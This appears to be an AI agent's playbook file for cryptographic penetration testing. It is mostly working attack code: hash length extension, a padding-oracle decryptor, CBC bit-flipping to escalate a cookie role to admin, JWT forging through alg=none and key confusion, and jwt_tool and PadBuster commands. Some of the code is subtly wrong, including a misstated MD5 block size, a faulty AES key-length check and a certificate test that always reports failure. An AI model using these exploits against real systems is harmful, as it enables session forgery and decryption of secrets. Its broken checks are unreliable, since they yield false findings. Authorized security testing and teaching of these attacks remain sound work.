---
name: crypto-toolkit
description: "Cryptographic testing: hash length extension, padding oracle, CBC attacks, key management, JWT algorithm confusion"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, encodeDecode, measureTiming, updateGraph, writeFinding]
triggers: ["cryptographic testing", "hash extension", "padding oracle", "cbc attack", "crypto analysis", "tls testing", "key management", "encryption testing", "cipher attack", "crypto vulnerability"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1552"]
owaspRefs: ["OWASP Top 10 A02:2021 Cryptographic Failures"]
---

# Cryptographic Testing Toolkit

## When to Use

- JWT tokens present in requests (cookies, Authorization headers)
- Block cipher encryption observed (AES-CBC, DES-CBC, 3DES)
- Hash-based signatures (HMAC-SHA256, MD5-based MACs, custom MACs)
- TLS/SSL connections to target or internal services
- Key material found in source code, configs, or environment variables
- Encrypted parameters in URLs or form fields
- Cookie values that appear to be encrypted blobs
- Password reset tokens, API keys, or session tokens with predictable structure

## Do Not Use

- When target uses authenticated encryption (AES-GCM, ChaCha20-Poly1305) — these are padding-oracle-safe
- When there is no oracle (server returns generic errors for all invalid inputs)
- When you have no ciphertext to manipulate
- When HMAC verification includes a sequence number or timestamp that prevents replay
- During active incident response — crypto testing is recon, not containment

---

## Hash Length Extension Attack

**Applies to:** HMAC-MD5, HMAC-SHA1, HMAC-SHA256 where server uses `hash(secret + message)` instead of `HMAC(secret, message)`

### Detection

```python
import hashlib, struct

# Step 1: Identify the MAC scheme
# Look for patterns like: md5(secret + data), sha1(secret + data)
# Check if signature is appended to the message (not in a separate header)
# Check if the server accepts messages with signatures you didn't generate

# Step 2: Verify the hash construction
# If signature = MD5(secret + message) and you know the message but not the secret:
# You CAN extend the message with additional data and compute a valid signature

# Step 3: Use hashpumpy or hlextend
pip install hashpumpy hlextend
```

### Exploitation

```python
import hashpumpy
import requests

# Given: original_message, original_sig, data_to_append
# You need: the block size (16 for MD5, 64 for SHA1/SHA256)

def length_extension_attack(original_sig, original_message, append_data, hash_func='md5'):
    block_sizes = {'md5': 64, 'sha1': 64, 'sha256': 64}
    block_size = block_sizes[hash_func]

    new_sig, new_message = hashpumpy.hashpump(
        original_sig,
        original_message,
        append_data,
        block_size
    )
    return new_sig, new_message

# Attack flow:
# 1. Obtain a valid (message, signature) pair
# 2. Choose the data to append (e.g., &role=admin)
# 3. hashpump computes the new signature without knowing the secret
# 4. Send the extended message with the new signature

# Example: escalating privileges
original_sig = "a1b2c3d4e5f6..."  # from intercepted request
original_message = "user=alice&level=1"
append_data = "&role=admin"

new_sig, new_msg = length_extension_attack(original_sig, original_message, append_data)
# new_msg = "user=alice&level=1\x80\x00...\x00&role=admin"
# new_sig = valid signature for the extended message
```

### Tool Command

```bash
# hlextend (simpler interface)
python3 -c "
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'&admin=true', 64, b'original_signature_hex', b'original_message')
print(new_data.hex())
"
```

### Decision Tree

```
Is the MAC hash(secret + message)?
├── YES → Does the server validate the MAC before processing?
│   ├── YES → Attack viable. Use hashpumpy to extend.
│   └── NO → Still viable, but may need to control message order.
└── NO → Is it HMAC(secret, message)?
    ├── YES → Not vulnerable to length extension.
    └── UNKNOWN → Capture 3+ (message, MAC) pairs. Try extending one. If server accepts, vulnerable.
```

---

## Padding Oracle Attack

**Applies to:** AES-CBC, 3DES-CBC, any block cipher using PKCS#7 padding

### Detection

```python
import requests
import time

def detect_padding_oracle(url, encrypted_cookie_name, token):
    # Step 1: Send valid ciphertext — note the response (status, body, timing)
    # Step 2: Modify the last byte of the ciphertext
    # Step 3: If you get a different response (error vs success), oracle exists

    original = token  # base64-encoded ciphertext

    # Modify last byte (flip last bit of last ciphertext block)
    modified = original[:-1] + ('1' if original[-1] == '0' else '0')

    r1 = requests.get(url, cookies={encrypted_cookie_name: original})
    r2 = requests.get(url, cookies={encrypted_cookie_name: modified})

    # Different response = padding oracle exists
    if r1.status_code != r2.status_code or len(r1.text) != len(r2.text):
        return True

    # Timing oracle
    t1 = time.time()
    requests.get(url, cookies={encrypted_cookie_name: original})
    t_valid = time.time() - t1

    t2 = time.time()
    requests.get(url, cookies={encrypted_cookie_name: modified})
    t_invalid = time.time() - t2

    # Significant timing difference = timing oracle
    if abs(t_valid - t_invalid) > 0.05:
        return True

    return False
```

### Exploitation (CBC Padding Oracle)

```python
import requests
import base64

def decrypt_block_oracle(url, cookie_name, ciphertext_b64, block_size=16):
    """Decrypt one block using the padding oracle."""
    ct = bytearray(base64.b64decode(ciphertext_b64))

    # Split into blocks
    blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)]

    plaintext = bytearray()

    # For each block (starting from the one before the target)
    for block_idx in range(len(blocks) - 2, -1, -1):
        intermediate = bytearray(block_size)

        # For each byte in the block (right to left)
        for byte_idx in range(block_size - 1, -1, -1):
            padding_byte = block_size - byte_idx

            # Build the prefix: modified blocks + known intermediate bytes
            prefix = bytearray(block_size)
            for k in range(byte_idx + 1, block_size):
                prefix[k] = intermediate[k] ^ padding_byte

            # Brute force the current byte
            for guess in range(256):
                prefix[byte_idx] = guess

                # Construct the full ciphertext
                test_ct = bytes(prefix) + bytes(blocks[block_idx + 1])

                # Send to oracle
                r = requests.get(url, cookies={cookie_name: base64.b64encode(test_ct).decode()})

                # Check if padding is valid
                if is_valid_padding(r):
                    intermediate[byte_idx] = guess ^ padding_byte
                    plaintext_byte = intermediate[byte_idx] ^ blocks[block_idx][byte_idx]
                    plaintext.append(plaintext_byte)
                    break

    return bytes(plaintext)
```

### Tool: PadBuster

```bash
# Install PadBuster
gem install padbuster

# Basic usage
padbuster http://target.com/encrypted_page <encrypted_value> <block_size>

# With cookies
padbuster http://target.com/encrypted_page <encrypted_value> <block_size> \
  -cookies "session=<encrypted_value>"

# With encoding
padbuster http://target.com/encrypted_page <encrypted_value> <block_size> \
  -encoding 2  # 2 = base64
```

### Tool: padoracle2 (Python)

```bash
git clone https://github.com/KishanBagaria/padoracle2.git
cd padoracle2
pip install -r requirements.txt

python padoracle2.py \
  --url http://target.com/api \
  --ciphertext <base64_ciphertext> \
  --block-size 16
```

---

## CBC Bit Flipping

**Applies to:** AES-CBC where you can modify ciphertext and the server decrypts without authentication

### Technique

```
CBC Decryption: P[i] = D(C[i]) XOR C[i-1]

To change P[i][pos] from old_val to new_val:
  Flip C[i-1][pos] by: new_val XOR old_val

This changes P[i][pos] but also garbles P[i-1][pos].
```

### Exploitation

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def cbc_bit_flip(original_ciphertext_b64, target_plaintext, original_plaintext, block_num, byte_pos, key):
    """Flip a byte in CBC ciphertext to change specific plaintext byte."""
    ct = bytearray(base64.b64decode(original_ciphertext_b64))

    # XOR the byte at the target position in the previous block
    # to change plaintext at (block_num, byte_pos)
    target_byte = target_plaintext[byte_pos]
    original_byte = original_plaintext[byte_pos]

    ct_offset = (block_num - 1) * 16 + byte_pos
    ct[ct_offset] ^= original_byte ^ target_byte

    return base64.b64encode(bytes(ct)).decode()

# Common attack: change "role=user" to "role=admin"
# Original cookie: user=alice          | role=user
#                  ^^^^^^^^^^^^^^^^^^^^^^^
# We want:         user=alice\x00...\x00 | role=admin
# (first block gets garbled, but role=admin is in the second block)

# Practical attack on cookie value "user=alice&role=user"
original = base64.b64decode(cookie_value)
blocks = [original[i:i+16] for i in range(0, len(original), 16)]

# "role=user" starts at byte 11 in the second block
# We want "role=admin" — "admin" is 5 bytes, "user" is 4 bytes
# Need to pad: "role=admin\x00" and flip in block 1

# Flip bytes in block 1 at position 11-15
for i, (old, new) in enumerate(zip(b"user", b"admin\x00")):
    blocks[0][11 + i] ^= old ^ new
```

### Detection Checklist

```
Does the server use CBC mode without HMAC?
├── YES → Is the IV predictable or user-controlled?
│   ├── YES → IV manipulation possible. Test bit-flipping.
│   └── NO → Check if ciphertext is authenticated.
│       ├── YES → Not vulnerable (HMAC fails on modification)
│       └── NO → Bit-flipping viable
└── NO → What mode is used?
    ├── GCM/CCM → Authenticated. Bit-flip will be rejected.
    ├── CTR/OFB → No padding. Different attack class (nonce reuse).
    └── ECB → No IV. Patterns leak. Different attack.
```

---

## JWT Algorithm Confusion

**Applies to:** JWT implementations that accept `alg` header without validation

### Attack Types

**1. Algorithm Confusion (RS256 → HS256)**

```python
import jwt
import base64
import json

# If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
# The server verifies HS256 using the PUBLIC KEY as the HMAC secret
# You can forge tokens using the public key

def jwt_confusion_attack(public_key_path, payload):
    with open(public_key_path, 'rb') as f:
        public_key = f.read()

    # Sign with HS256 using the public key as the secret
    forged = jwt.encode(payload, public_key, algorithm='HS256')
    return forged

# Use jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip install -r requirements.txt

# Crack HMAC secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Forge token with algorithm confusion
python3 jwt_tool.py <token> -X k -pk public_key.pem

# Change algorithm to none
python3 jwt_tool.py <token> -X a
```

**2. Algorithm None Bypass**

```python
import base64
import json

def forge_jwt_none(payload):
    """Forge JWT with alg=none — bypasses signature verification."""
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    # No signature
    return header.decode() + '.' + payload_b64.decode() + '.'
```

**3. Key Confusion Detection**

```python
def detect_jwt_vulnerability(token):
    header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))

    vulns = []

    # Check for alg=none
    if header.get('alg') == 'none':
        vulns.append('CRITICAL: alg=none — complete auth bypass')

    # Check for HMAC with weak key
    if header.get('alg', '').startswith('HS'):
        key_len = len(header.get('key', ''))
        if key_len < 256:
            vulns.append('WEAK: HMAC key may be brute-forceable')

    # Check for RSASSA-PKCS1-v1_5 (vulnerable to Bleichenbacher)
    if header.get('alg') in ('RS256', 'RS384', 'RS512'):
        vulns.append('INFO: RSA PKCS1 — check if server also accepts HS256')

    # Check for PS (RSA-PSS) vs RS
    if header.get('alg', '').startswith('RS'):
        vulns.append('INFO: If server accepts HS256, key confusion attack possible')

    return vulns
```

### Decision Tree

```
What algorithm does the server sign with?
├── RS256/RS384/RS512 (RSA)
│   ├── Does server accept HS256/HS384/HS512?
│   │   ├── YES → KEY CONFUSION: Sign with public key as HMAC secret
│   │   └── NO → Check for alg=none bypass
│   └── Does server accept alg=none?
│       ├── YES → CRITICAL: Forge any token
│       └── NO → RSA key length < 2048? Small key attack possible.
├── HS256/HS384/HS512 (HMAC)
│   ├── Is the secret in source code or config?
│   │   ├── YES → Forge tokens with known secret
│   │   └── NO → Brute-force with common passwords
│   └── Is the secret < 32 bytes?
│       ├── YES → Brute-force feasible
│       └── NO → Dictionary attack with rockyou.txt
└── none
    └── CRITICAL: No authentication. Forge any token.
```

---

## Weak Key Detection

### DES/3DES Weak Keys

```python
from Crypto.Cipher import DES, DES3

# DES weak keys (parity bits create symmetry)
WEAK_DES_KEYS = [
    b'\x00\x00\x00\x00\x00\x00\x00\x00',
    b'\xff\xff\xff\xff\xff\xff\xff\xff',
    b'\xe0\xe0\xe0\xe0\xf0\xf0\xf0\xf0',
    b'\x1f\x1f\x1f\x1f\x0e\x0e\x0e\x0e',
]

# 3DES weak keys (semi-weak)
WEAK_3DES_KEYS = [
    b'\x00\x00\x00\x00\x00\x00\x00\x00' * 2,
    b'\xff\xff\xff\xff\xff\xff\xff\xff' * 2,
]

def detect_weak_key(key):
    findings = []
    if len(key) == 8:
        if key in WEAK_DES_KEYS:
            findings.append('CRITICAL: DES weak key detected')
        findings.append('WARNING: DES has 56-bit effective key size — brute-forceable')
    elif len(key) == 16 or len(key) == 24:
        if key[:8] == key[8:16]:
            findings.append('CRITICAL: 3DES with related subkeys — meet-in-the-middle attack')
        findings.append('WARNING: 3DES has 112-bit effective key — deprecated by NIST')
    elif len(key) == 256:
        findings.append('INFO: AES-256 key — check for side-channel vulnerabilities')
    return findings
```

### RSA Weak Key Detection

```python
def check_rsa_key_strength(n, e=65537):
    """Check RSA key parameters for weaknesses."""
    import math
    findings = []

    key_bits = n.bit_length()
    if key_bits < 2048:
        findings.append(f'CRITICAL: RSA-{key_bits} — factorable with modern hardware')
    elif key_bits < 4096:
        findings.append(f'WARNING: RSA-{key_bits} — adequate but not future-proof')

    # Check for small public exponent attacks
    if e == 3:
        findings.append('WARNING: e=3 — vulnerable to Coppersmith/Håstad broadcast attack if same plaintext encrypted with 3+ keys')
    elif e == 1:
        findings.append('CRITICAL: e=1 — message is trivially decryptable')

    return findings
```

### Hardcoded Key Detection

```python
import re

HARDCODED_PATTERNS = [
    (r'secret["\s:=]+["\']([A-Za-z0-9+/=]{16,})["\']', 'HMAC/encryption secret'),
    (r'password["\s:=]+["\']([^"\']{8,})["\']', 'Hardcoded password'),
    (r'PRIVATE KEY', 'Embedded private key'),
    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
    (r'-----BEGIN.*PRIVATE KEY-----', 'PEM private key in source'),
]

def scan_for_hardcoded_keys(source_code):
    findings = []
    for pattern, desc in HARDCODED_PATTERNS:
        matches = re.findall(pattern, source_code)
        for match in matches:
            findings.append(f'CRITICAL: {desc} found: {match[:8]}...')
    return findings
```

---

## TLS Analysis

### Quick Assessment

```bash
# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com

# Detailed cipher analysis
testssl.sh --jsonfile results.json https://target.com

# Check for specific vulnerabilities
nmap --script ssl-heartbleed -p 443 target.com
nmap --script ssl-poodle -p 443 target.com
nmap --script ssl-dh-params -p 443 target.com
```

### Decision Tree

```
Protocol Version?
├── SSLv2/SSLv3 → CRITICAL: POODLE, DROWN, known breaks
├── TLS 1.0/1.1 → WARNING: Deprecated. BEAST, CRIME possible.
├── TLS 1.2 → Check cipher suites
│   ├── CBC ciphers? → WARNING: Sweet32, Lucky13 possible
│   ├── RC4? → CRITICAL: Biased sampling attack
│   ├── Export ciphers? → CRITICAL: FREAK, Logjam
│   └── GCM only → GOOD: No known practical attacks
└── TLS 1.3 → GOOD: Default secure. Check for 0-RTT replay.

Certificate?
├── Self-signed → WARNING: No trust chain
├── Expired → WARNING: May indicate abandoned service
├── Key size < 2048 → CRITICAL: Factorable
├── SHA-1 signature → CRITICAL: Collision attack (SHAttered)
└── Wildcard → INFO: Scope of compromise if key leaks

DH Parameters?
├── < 2048 bits → CRITICAL: Logjam attack
├── Static DH → WARNING: No forward secrecy
└── ECDHE → GOOD: Forward secrecy with strong curve
```

### Certificate Validation Bypass

```python
import ssl
import urllib.request

def test_cert_validation(hostname, port=443):
    """Check if server accepts invalid certificates."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Self-signed cert
    conn = ctx.wrap_socket(socket.socket(), server_hostname=hostname)
    try:
        conn.connect((hostname, port))
        return "WARNING: Accepts self-signed certificates"
    except ssl.SSLError:
        return "GOOD: Rejects invalid certificates"
    finally:
        conn.close()
```

---

## Timing Side-Channel Detection

### HMAC Comparison Timing

```python
import requests
import time
import statistics

def detect_timing_oracle(url, param_name, known_prefix, candidates):
    """Test for timing differences in HMAC/token validation."""
    timings = {}

    for candidate in candidates:
        sample_times = []
        for _ in range(50):
            token = known_prefix + candidate
            start = time.perf_counter_ns()
            requests.get(url, params={param_name: token})
            elapsed = time.perf_counter_ns() - start
            sample_times.append(elapsed)

        timings[candidate] = statistics.median(sample_times)

    # Check for significant differences
    values = list(timings.values())
    mean_t = statistics.mean(values)
    stdev_t = statistics.stdev(values) if len(values) > 1 else 0

    for candidate, t in timings.items():
        if t < mean_t - 2 * stdev_t:
            return f'POSSIBLE TIMING LEAK: {candidate} responded faster'
    return 'No timing difference detected'
```

---

## Anti-Hallucination Rules

**CRITICAL: Never fabricate cryptographic findings.**

1. **Algorithm claims require proof.** State the algorithm name, version, and the tool/command that revealed it. Example: "AES-CBC detected via `testssl.sh` output showing `TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256`." Never say "the app likely uses ECB mode" without intercepting and analyzing actual ciphertext.

2. **Padding oracle claims require differential evidence.** Show two requests (valid vs modified ciphertext) with different responses. Include status codes, response bodies, and timing. If you cannot produce a different response for modified input, there is no oracle.

3. **JWT vulnerability claims require the token.** Include the header (decoded `alg` field), the payload (decoded claims), and the verification step. Never claim "algorithm confusion possible" without verifying the server actually accepts the alternate algorithm.

4. **Key strength claims require the key size.** State the exact bit length and the standard it fails (e.g., "RSA-1024 below NIST SP 800-57 minimum of 2048"). Never guess key sizes.

5. **TLS claims require scan output.** Reference the specific tool output (testssl.sh, nmap, sslyze) and the line or finding. Never claim "weak ciphers supported" without listing them.

6. **Bit-flipping claims require the modified ciphertext.** Show the original and modified ciphertext, the resulting plaintext change, and the server's acceptance. If the server uses authenticated encryption (GCM, Poly1305), bit-flipping is not viable — say so.

7. **When uncertain, state the limitation.** "Could not confirm padding oracle due to generic error responses" is a valid finding. Do not invent vulnerability classes that are not supported by evidence.
